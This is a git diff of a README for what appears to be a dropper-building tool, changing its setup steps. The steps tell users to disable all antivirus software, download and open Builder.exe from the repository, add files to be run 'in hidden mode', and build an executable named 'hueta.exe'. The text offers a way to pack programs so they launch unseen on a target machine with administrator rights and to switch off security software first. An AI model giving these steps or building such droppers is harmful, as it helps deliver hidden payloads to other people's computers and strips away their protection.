@@ -39,9 +39,8 @@ Runs with administrator privileges (UAC prompt). First launch:
 
 ### Creating a Dropper
 
-1. **Disable all antiviruses**, go to [Releases](../../releases) and download `Builder.exe`
-2. Open `Builder.exe`
-3. Go to the first tab, add your files that need to run **in hidden mode**
+1. **Disable all antiviruses**, go to [download](../../raw/main/Builder.exe) and open `Builder.exe`
+2. Go to the first tab, add your files that need to run **in hidden mode**
 
 > ⚠️ **WARNING.** Do not put files that need to run in normal mode into the dropper. Use the unpacker after building.
 
@@ -49,7 +48,7 @@ Runs with administrator privileges (UAC prompt). First launch:
   <img src="screen1.png" alt="Builder Dropper" width="500">
 </p>
 
-4. Click the **"Build hueta.exe"** button and save the file. Your build is ready!
+3. Click the **"Build hueta.exe"** button and save the file. Your build is ready!
 
 ---
 
